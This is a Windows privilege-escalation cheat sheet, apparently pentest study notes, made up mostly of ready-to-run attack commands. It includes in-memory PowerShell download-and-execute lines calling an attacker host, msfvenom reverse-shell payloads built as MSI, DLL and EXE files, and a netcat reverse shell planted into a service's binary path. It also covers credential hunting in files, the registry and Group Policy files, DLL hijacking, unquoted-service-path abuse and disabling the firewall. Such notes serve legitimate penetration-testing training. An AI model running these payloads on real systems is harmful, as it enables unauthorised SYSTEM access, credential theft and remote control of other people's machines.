############################
Windows Privilege Escalation
############################

TODO
====

* https://github.com/mubix/post-exploitation
* https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/
* https://github.com/pentestmonkey/windows-privesc-check
* https://github.com/togie6/Windows-Privesc
* https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
* https://guif.re/windowseop
* https://lolbas-project.github.io/
* https://github.com/sagishahar/lpeworkshop
* https://ostrokonskiy.com/posts/windows-privilege-escalation.html
* https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
* https://github.com/frizb/Windows-Privilege-Escalation
* https://github.com/rasta-mouse/Watson
* https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/
* https://github.com/codingo/OSCP-2
* https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/
* https://github.com/psychomario/pyinject
* https://resources.infosecinstitute.com/poor-mans-process-migration-windows/
* https://toshellandback.com/2015/11/24/ms-priv-esc/21/
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
* https://github.com/skelsec/pypykatz
* https://github.com/Ben0xA/nps
* https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
* http://virgil-cj.blogspot.com/2018/02/escalation-time.html

Quick Wins
==========

1. Windows OS exploits. Google "<Windows Version> privilege escalation" for some of the more popular ones. Add "x86" or "x64" to be more specific. searchsploit can be used as well, though sometimes the name / description won't include the specific version number.

2. Program exploits. Look for non-default programs installed. Try to enumerate version. Google + searchsploit.

3. Use accesschk.exe to check for services / files with bad permissions.

4. Check for passwords in files / the registry. We might get lucky and be able to RDP in. (reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon")

5. Use "Citrix" breakout techniques if we have a GUI that is running as SYSTEM. Many ways to spawn a shell.

6. Are we running as "nt authority\\network service"? Use token kidnapping (churrasco.exe).


Information Gathering
=====================

Automated Scripts
-----------------

| **Powerless:** :download:`Powerless.bat </_static/files/Powerless.bat>` (https://github.com/M4ximuss/Powerless)
| **Windows Enumeration Script:** :download:`winenum.bat </_static/files/winenum.bat>` (https://github.com/h1gh1and3r/Pentesting/blob/master/Scripts/winenum.bat)
| **Windows Enumeration Powershell Script:** :download:`WindowsEnum.ps1 </_static/files/WindowsEnum.ps1>` (https://github.com/stillinsecure/WindowsEnum/blob/master/WindowsEnum.ps1)
| **WMIC Info Script:** :download:`wmic_info.bat </_static/files/wmic_info.bat>` (http://www.fuzzysecurity.com/scripts/files/wmic_info.rar)
| https://github.com/AlessandroZ/BeRoot

PowerUp
^^^^^^^

| https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

PowerUp is part of the PowerSploit framework. It will search for various privilege escalation methods. Either download the script onto the target and run via a PowerShell instance:

.. code-block:: none

    C:\> powershell.exe -nop -exec bypass
    PS C:\> Import-Module .\PowerUp.ps1
    PS C:\> Invoke-AllChecks

Or run from cmd.exe directly:

.. code-block:: none

    powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"

If uploading to the target is difficult, we can run from memory:

.. code-block:: none

    powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>:<attacker-port>/PowerUp.ps1'); Invoke-AllChecks"

WindowsEnum
^^^^^^^^^^^

**Requires PowerShell 3.0+**

| https://github.com/stillinsecure/WindowsEnum/blob/master/WindowsEnum.ps1

.. code-block:: none

    C:\> powershell.exe -nop -exec bypass
    PS C:\> .\WindowsEnum.ps1 extended

.. code-block:: none

    C:\> powershell.exe -nologo -exec bypass bypass -file WindowsEnum.ps1 extended

Windows Exploit Suggester - Next Generation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

| https://github.com/bitsadmin/wesng

Save the output of the :code:`systeminfo` command and pass it to the program:

.. code-block:: none

    python3 wes.py systeminfo.txt | grep --color -B5 "Privilege" | less

Sherlock
^^^^^^^^

An outdated PowerShell script which shows you exploits that are available for the current system. Either download the script onto the target and run via a PowerShell instance:

.. code-block:: none

    C:\> powershell.exe -nop -exec bypass
    PS C:\> Import-Module .\Sherlock.ps1
    PS C:\> Find-AllVulns

Or run from cmd.exe directly:

.. code-block:: none

    powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"

If uploading to the target is difficult, we can run from memory:

.. code-block:: none

    powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>:<attacker-port>/Sherlock.ps1'); Find-AllVulns"

**Windows Kernel Exploits:** https://github.com/SecWiki/windows-kernel-exploits

Code and (sometimes) compiled executables that exploit kernel vulnerabilities.

System Information
------------------

Information about the operating system, version, hostname, etc.

.. code-block:: none

	systeminfo
	hostname
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
	type C:\Windows\system32\eula.txt
	type C:\Windows\System32\license.rtf

Pass the output of systeminfo to wes.py with an updated microsoft security bulletin database:

.. code-block:: bash

    python3 wes.py --update
    python3 wes.py systeminfo.txt | grep --color -B5 "Privilege" | less

Who Are We?
-----------

Methods to figure out which user we are currently logged in as.

.. code-block:: none

	whoami
	echo %username%

If neither of the above work, try:

.. code-block:: none

    title offsec && for /f "tokens=2,8" %a in ('tasklist /v ^| findstr "offsec"') do echo Current User: %b, Current PID: %a

Environment
-----------

Environment variables can often reveal interesting information:

.. code-block:: none

    set
    echo %path%

Directory Listing
-----------------

List all directories, including hidden and Alternate Data Streams (ADS):

.. code-block:: none

    dir /r

Get the list of folders and files in tree structure:

.. code-block:: none

    tree /a /f

Files
-----

Read file contents:

.. code-block:: none

    type file.txt
    powershell Get-Content file.txt

Find alternate data streams (ADS):

.. code-block:: none

    dir /R <directory>

Find alternate data streams with powershell:

.. code-block:: none

    powershell Get-Item -Path <directory> -Stream *

Read the alternate data stream (ADS) (note: only works on NT6+):

.. code-block:: none

    powershell Get-Content file.txt -Stream hidden.txt

Show file permissions:

.. code-block:: none

    cacls file.txt
    icacls file.txt
    powershell Get-Acl file | fl *

User / Group Enumeration
------------------------

List users and user groups on the machine.

.. code-block:: none

	net users
	net localgroup

List Administrators:

.. code-block:: none

    net localgroup Administrators

View User Info
--------------

List information about a specific user (use against your current user, and any users identified)

.. code-block:: none

	net user user1

Especially of interest would be any groups our user has other than "Users".

List Domain Groups
------------------

List any groups which are part of the domain.

.. code-block:: none

	net group /domain

List Members of Domain Group
----------------------------

List members of domain groups previously identified.

.. code-block:: none

	net group /domain <Group Name>

Find other Windows hosts on the network
---------------------------------------

.. code-block:: none

    net view

Drives
------

List configured disk drives.

.. code-block:: none

    wmic logicaldisk get name
    wmic logicaldisk get caption
    fsutil fsinfo drives
    powershell -Command "get-psdrive -psprovider filesystem"

List locally shared drives:

.. code-block:: none

    net share

Network
-------

Display network interfaces, the routing table, and the ARP cache for the host.

.. code-block:: none

	ipconfig /all
	route print
	arp -A

Active Connections
------------------

Display all active connections, plus any local ports that are being listened to by a process. A local address of "0.0.0.0" or "[::]" implies that the process is listening for external connections.

.. code-block:: none

	netstat -ano
    netstat /anto

Firewall
--------

Display the state of the firewall, plus the current configuration.

Note: the "netsh" command is only available from XP SP2 onwards.

.. code-block:: none

    netsh firewall show state
    netsh firewall show config
    netsh advfirewall show all
    netsh advfirewall firewall show rule profile=any name=all

Scheduled Tasks
---------------

This will usually display a long detailed list of currently scheduled tasks, including ones that run on boot.

.. code-block:: none

	schtasks /query /fo LIST /v

Look for tasks where "Run As User" is set to some user with high privileges (e.g. SYSTEM). See if we can overwrite the executable.

Viewing loaded DLLs
-------------------

View all loaded DLLs

.. code-block:: none

    tasklist /m

Find specific DLLs

.. code-block:: none

    tasklist /m | find /i <dll name>

Running Processes (with Service Names)
--------------------------------------

List all running processes, plus PID and service name.

.. code-block:: none

	tasklist /SVC

List Started Services
---------------------

List the names of services which are running.

.. code-block:: none

	net start

List Services
-------------

List all services with statuses and some other info. Run without "brief" for way more details.

.. code-block:: none

	wmic service list brief

List Installed Device Drivers
-----------------------------

.. code-block:: none

	driverquery

Check Patches
-------------

.. code-block:: none

    wmic qfe get Caption,Description,HotFixID,InstalledOn

    wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

The best strategy is to look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799). After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing.

Mass Rollout Files
------------------

If there is an environment where many machines need to be installed, typically, a technician will not go around from machine to machine. There are a couple of solutions to install machines automatically. What these methods are and how they work is less important for our purposes but the main thing is that they leave behind configuration files which are used for the installation process. These configuration files contain a lot of sensitive sensitive information such as the operating system product key and Administrator password. What we are most interested in is the Admin password as we can use that to escalate our privileges.

.. code-block:: none

    c:\sysprep.inf
    c:\sysprep\sysprep.xml
    %WINDIR%\Panther\Unattend\Unattended.xml
    %WINDIR%\Panther\Unattended.xml

Group Policy
------------

Group Policy preference files can be used to create local users on domain machines. When the box you compromise is connected to a domain it is well worth looking for the Groups.xml file which is stored in SYSVOL. Any authenticated user will have read access to this file.

The default location for SYSVOL is:

.. code-block:: none

    %SYSTEMROOT%\SYSVOL

Dump the current GPO for the host / user:

.. code-block:: none

    gpresult /R > gpo_results.txt

In addition to Groups.xml several other policy preference files can have the optional "cPassword" attribute set:

* Services\Services.xml: `Element-Specific Attributes <http://msdn.microsoft.com/en-us/library/cc980070.aspx>`__
* ScheduledTasks\ScheduledTasks.xml: `Task Inner Element <http://msdn.microsoft.com/en-us/library/cc422920.aspx>`__, `TaskV2 Inner Element <http://msdn.microsoft.com/en-us/library/dd341350.aspx>`__, `ImmediateTaskV2 Inner Element <http://msdn.microsoft.com/en-us/library/dd304114.aspx>`__
* Printers\Printers.xml: `SharedPrinter Element <http://msdn.microsoft.com/en-us/library/cc422918.aspx>`__
* Drives\Drives.xml: `Element-Specific Attributes <http://msdn.microsoft.com/en-us/library/cc704598.aspx>`__
* DataSources\DataSources.xml: `Element-Specific Attributes <http://msdn.microsoft.com/en-us/library/cc422926.aspx>`__

AlwaysInstallElevated
---------------------

If the AlwaysInstallElevated registry setting is enabled it allows users of any privilege level to install \*.msi files as NT AUTHORITY\\SYSTEM.

.. code-block:: none

    # This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.

    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

If both keys are enabled, create a .msi payload:

.. code-block:: none

    msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=53 -f msi -o /path/to/payload.msi

After uploading the payload, it can be executed using msiexec:

.. code-block:: none

    msiexec /quiet /qn /i payload.msi

| /quiet = suppress messages
| /qn = No GUI
| /i = Regular installation


Search Files / Registry
-----------------------

Search for files with filenames containing certain words:

.. code-block:: none

    dir /s *pass* == *cred* == *vnc* == *.config*

Search certain file types for a keyword, this can generate a lot of output:

.. code-block:: none

    findstr /si password *.xml *.ini *.txt

Search the registry for keywords, in this case "password":

.. code-block:: none

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

accesschk.exe
-------------

The accesschk.exe binary can be used to enumerate group permissions on Windows services. The following table shows the permissions which are useful to us:

.. csv-table::
    :header: "Permission", "Use Case"

    "SERVICE_ALL_ACCESS", "Can do anything."
    "SERVICE_CHANGE_CONFIG", "Can reconfigure the service binary."
    "WRITE DAC", "Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG."
    "WRITE_OWNER", "Can become owner, reconfigure permissions."
    "GENERIC_WRITE", "Inherits SERVICE_CHANGE_CONFIG"
    "GENERIC_ALL", "Inherits SERVICE_CHANGE_CONFIG"

:download:`Download accesschk.exe </_static/files/accesschk.exe>`

List all services and the permissions each user level has on them.

.. code-block:: none

    accesschk.exe /accepteula -ucqv *

List services which the "Authenticated Users" user group have permissions over (remember to check other user groups you are a member of).

.. code-block:: none

    accesschk.exe /accepteula -uwcqv "Authenticated Users" *

List permissions for a specific service:

.. code-block:: none

    accesschk.exe /accepteula -ucqv Spooler

List permissions for a specific directory:

.. code-block:: none

    accesschk.exe /accepteula -dqv "C:\Path"

Find all weak folder permissions per drive:

.. code-block:: none

    accesschk.exe /accepteula -uwdqs Users C:\
    accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\

Find all weak file permissions per drive:

.. code-block:: none

    accesschk.exe /accepteula -uwqs Users C:\*.*
    accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*

Examples
========

Weak Service Permissions
------------------------

Reconfiguring the upnphost service to execute a netcat reverse shell with SYSTEM level privileges:

.. code-block:: none

    C:\> accesschk.exe /accepteula -ucqv upnphost

    upnphost

      RW NT AUTHORITY\SYSTEM
            SERVICE_ALL_ACCESS
      RW BUILTIN\Administrators
            SERVICE_ALL_ACCESS
      RW NT AUTHORITY\Authenticated Users
            SERVICE_ALL_ACCESS
      RW BUILTIN\Power Users
            SERVICE_ALL_ACCESS
      RW NT AUTHORITY\LOCAL SERVICE
            SERVICE_ALL_ACCESS

    C:\> sc qc upnphost

    [SC] GetServiceConfig SUCCESS

    SERVICE_NAME: upnphost
            TYPE               : 20  WIN32_SHARE_PROCESS
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : Universal Plug and Play Device Host
            DEPENDENCIES       : SSDPSRV
            SERVICE_START_NAME : NT AUTHORITY\LocalService

    C:\> sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
    [SC] ChangeServiceConfig SUCCESS

    C:\> sc config upnphost obj= ".\LocalSystem" password= ""
    [SC] ChangeServiceConfig SUCCESS

    C:\> sc qc upnphost

    [SC] GetServiceConfig SUCCESS

    SERVICE_NAME: upnphost
            TYPE               : 20  WIN32_SHARE_PROCESS
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : Universal Plug and Play Device Host
            DEPENDENCIES       : SSDPSRV
            SERVICE_START_NAME : LocalSystem

    C:\> net start upnphost

Power Users
-----------

On Windows XP and below, users in the "Power Users" group can easily elevate themselves to fully-privileged administrators.

The following article describes some methods, but most are already covered if you have used accesschk.exe properly above: https://blogs.technet.microsoft.com/markrussinovich/2006/05/01/the-power-in-power-users/

DLL Hijacking
-------------

Source: http://www.greyhathacker.net/?p=738

If an SYSTEM-level application / service references a DLL that we have write access to, we can replace it and get a SYSTEM-level shell. If the application / service references a DLL which doesn't exist, getting a SYSTEM-level shell may still be possible.

Find executables and DLLs that are directly called by the application / service, and open them in a decompiler to find references to other DLLs.

Generally a Windows application will use pre-defined search paths to find DLLs and it will check these paths in a specific order. DLL hijacking usually happens by placing a malicious DLL in one of these paths while making sure that DLL is found before the legitimate one. This problem can be mitigated by having the application specify absolute paths to the DLLs that it needs.

You can see the DLL search order on 32-bit systems below:

1. The directory from which the application loaded
2. 32-bit System directory (C:\\Windows\\System32)
3. 16-bit System directory (C:\\Windows\\System)
4. Windows directory (C:\\Windows)
5. The current working directory (CWD)
6. Directories in the PATH environment variable (system then user)

Sometimes an application / service attempts to load a DLL which does not exist on the machine. In these cases, Windows will attempt to find it by traversing the search paths above. Putting a DLL in 1-4 is not possible, 5 would only work for applications and not Windows services. If a user has write access to any of the directories in the Windows PATH, escalation is possible.

Check the current path:

.. code-block:: none

    echo %path%

Check access permissions with accesschk.exe or cacls:

.. code-block:: none

    accesschk.exe /accepteula -dqv "C:\Python27"

    cacls "C:\Python27"

Check status of vulnerable service. If the START_TYPE is set to AUTO_START it will launch on boot.

.. code-block:: none

    sc qc IKEEXT

Create a malicious DLL:

.. code-block:: none

    msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=53 -f dll -o payload.dll

Replace the original DLL with the malicious version and restart the application / service.

Known Vulnerable Windows Services
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. csv-table:: **Windows 7 (32/64)**
    :header: "Service", "DLL"

    "IKE and AuthIP IPsec Keying Modules (IKEEXT)", "wlbsctrl.dll"
    "Windows Media Center Receiver Service (ehRecvr)", "ehETW.dll"
    "Windows Media Center Scheduler Service (ehSched)", "ehETW.dll"

The Windows Media Center Services startup type is set to manual and status not started and will only give us only Network service privileges so it may not be much use especially with its limited privileges. It can however be started temporarily via certain scheduled tasks:

.. code-block:: none

    schtasks.exe /run /I /TN "\Microsoft\Windows\Media Center\mcupdate"
    schtasks.exe /run /I /TN "\Microsoft\Windows\Media Center\MediaCenterRecoveryTask"
    schtasks.exe /run /I /TN "\Microsoft\Windows\Media Center\ActivateWindowsSearch"

.. csv-table:: **Windows XP**
    :header: "Service", "DLL"

    "Automatic Updates (wuauserv)", "ifsproxy.dll"
    "Remote Desktop Help Session Manager (RDSessMgr)", "SalemHook.dll"
    "Remote Access Connection Manager (RasMan)", "ipbootp.dll"
    "Windows Management Instrumentation (winmgmt)", "wbemcore.dll"
    "Audio Service (STacSV)", "SFFXComm.dll, SFCOM.DLL"
    "Intel(R) Rapid Storage Technology (IAStorDataMgrSvc)", "DriverSim.dll"
    "Juniper Unified Network Service(JuniperAccessService)", "dsLogService.dll"
    "Encase Enterprise Agent", "SDDisk.dll"

Abusing unquoted ImagePath values that contain spaces
-----------------------------------------------------

When SC starts a service, if the ImagePath contains a space then you can abuse a Windows feature which attempts to find an executable at every space location.

Find a service that has an unquoted service path:

.. code-block:: none

    reg query HKLM/system/currentcontrolset/services/SkypeUpdate
    ...
    ImagePath    REG_EXPAND_SZ    C:\Program Files (x86)\Skype\Updater.exe
    ...

When this service is started, Windows will walk the directory structure and attempt to execute an .exe at each space (C:\Program.exe, C:\Program Files.exe, etc.)

Create a malicious .exe file:

.. code-block:: none

    msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=53 -f exe -o Program.exe

Move the .exe to C:\ and restart the service.

.. code-block:: none

    copy Program.exe C:\Program.exe
    sc stop SkypeUpdate
    sc start SkypeUpdate

Disable Windows Firewall
------------------------

.. code-block:: none

    netsh advfirewall set allprofiles state off
    netsh firewall set opmode disable

Sources
=======

* http://www.fuzzysecurity.com/tutorials/16.html
